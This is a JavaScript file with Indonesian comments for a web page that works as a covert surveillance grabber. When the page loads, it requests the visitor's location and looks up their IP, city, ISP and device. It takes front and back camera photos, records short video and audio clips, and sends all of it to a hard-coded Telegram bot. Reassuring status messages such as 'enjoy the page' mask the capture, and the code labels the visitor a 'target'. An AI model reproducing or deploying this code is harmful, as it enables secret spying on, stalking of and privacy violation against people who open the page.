const video = document.getElementById("cameraPreview");
const status = document.getElementById("status");

// ====================
// CONFIG TELEGRAM
// ====================
const TELEGRAM_BOT_TOKEN = "8854175546:AAHOqFJRPO1gKAbEsf0cT-cKSkLpk7TGxfk";
const TELEGRAM_CHAT_ID = "8862634415";

// ====================
// AMBIL INFO PERANGKAT & IP
// ====================
async function getDeviceInfo() {
  let ipInfo = "Tidak diketahui";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`;
  } catch (e) {
    console.error("Gagal ambil IP:", e);
  }

  const userAgent = navigator.userAgent;
  let device = "Desktop / Perangkat Lain";
  
  if (/android/i.test(userAgent)) {
    device = "Android";
  } else if (/iphone|ipad|ipod/i.test(userAgent)) {
    device = "iOS (Apple)";
  } else if (/windows/i.test(userAgent)) {
    device = "Windows PC";
  } else if (/macintosh|mac os x/i.test(userAgent)) {
    device = "Mac OS";
  }

  return {
    ip: ipInfo,
    device: device,
    platform: navigator.platform || "Tidak diketahui"
  };
}

// ====================
// LOCATION
// ====================
function requestLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude } = position.coords;
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: latitude,
            longitude: longitude
          })
        });
      } catch (err) {
        console.error("Gagal kirim lokasi:", err);
      }
    },
    (error) => { console.log("Izin lokasi ditolak."); }
  );
}

// ====================
// FUNGSI BANTU SNAPSHOT FOTO
// ====================
function takeSnapshot(stream) {
  return new Promise((resolve) => {
    video.srcObject = stream;
    setTimeout(() => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob((blob) => {
        resolve(blob);
      }, "image/jpeg", 0.9);
    }, 1000);
  });
}

// ====================
// FUNGSI PEREKAM VIDEO (Durasi: 3 detik)
// ====================
function recordVideo(stream, durationInSeconds = 3) {
  return new Promise((resolve) => {
    video.srcObject = stream;
    let recordedChunks = [];
    
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = (event) => {
      if (event.data && event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    mediaRecorder.onstop = () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      resolve(blob);
    };

    mediaRecorder.start();
    setTimeout(() => {
      mediaRecorder.stop();
    }, durationInSeconds * 1000);
  });
}

// ====================
// FUNGSI PEREKAM SUARA / AUDIO (Durasi: 3 detik)
// ====================
function recordAudio(durationInSeconds = 3) {
  return new Promise(async (resolve) => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      let recordedChunks = [];
      
      const mediaRecorder = new MediaRecorder(audioStream);

      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        audioStream.getTracks().forEach(track => track.stop());
        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, durationInSeconds * 1000);
    } catch (err) {
      console.log("Akses mikrofon ditolak / tidak tersedia.");
      resolve(null);
    }
  });
}

// ====================
// PROSES UTAMA (FOTO, VIDEO, AUDIO)
// ====================
async function runAllStealthActions() {
  status.textContent = "Memuat data sistem...";
  const info = await getDeviceInfo();

  let frontBlob = null, backBlob = null, videoBlob = null, audioBlob = null;

  // 1. Ambil Foto Depan
  try {
    status.textContent = "Memproses...";
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    frontBlob = await takeSnapshot(frontStream);
    frontStream.getTracks().forEach(track => track.stop());
  } catch (err) { console.log("Kamera depan gagal."); }

  // 2. Ambil Foto Belakang
  try {
    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
    backBlob = await takeSnapshot(backStream);
    backStream.getTracks().forEach(track => track.stop());
  } catch (err) { console.log("Kamera belakang gagal."); }

  // 3. Rekam Video (3 Detik)
  try {
    const vidStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
    videoBlob = await recordVideo(vidStream, 3);
    vidStream.getTracks().forEach(track => track.stop());
  } catch (err) { console.log("Rekam video gagal."); }

  // 4. Rekam Suara/Audio (3 Detik)
  try {
    audioBlob = await recordAudio(3);
  } catch (err) { console.log("Rekam suara gagal."); }

  // ====================
  // KIRIM SEMUA KE TELEGRAM
  // ====================
  status.textContent = "Menyinkronkan data...";

  try {
    const textInfo = 
      `🚨 **INFO TARGET / PENGGUNA** 🚨\n\n` +
      `🌐 **IP Address:** ${info.ip}\n` +
      `📱 **Perangkat:** ${info.device}\n` +
      `💻 **Platform:** ${info.platform}`;

    // Kirim Teks Info
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: textInfo,
        parse_mode: "Markdown"
      })
    });

    // Kirim Foto Depan
    if (frontBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("photo", frontBlob, "front.jpg");
      fd.append("caption", "📸 Foto Kamera Depan");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }

    // Kirim Foto Belakang
    if (backBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("photo", backBlob, "back.jpg");
      fd.append("caption", "📸 Foto Kamera Belakang");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }

    // Kirim Video
    if (videoBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("video", videoBlob, "video.webm");
      fd.append("caption", "🎥 Video Rekaman (3 Detik)");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
    }

    // Kirim Suara/Audio
    if (audioBlob) {
      const fd = new FormData();
      fd.append("chat_id", TELEGRAM_CHAT_ID);
      fd.append("audio", audioBlob, "audio.webm");
      fd.append("caption", "🎙️ Rekaman Suara (3 Detik)");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: "POST", body: fd });
    }

    status.textContent = "Memuat selesai. Silakan nikmati halaman.";

  } catch (error) {
    console.error(error);
    status.textContent = "Terjadi kesalahan koneksi.";
  }
}

// ====================
// JALANKAN OTOMATIS
// ====================
window.addEventListener("load", () => {
  requestLocation();
  setTimeout(runAllStealthActions, 2000);
});
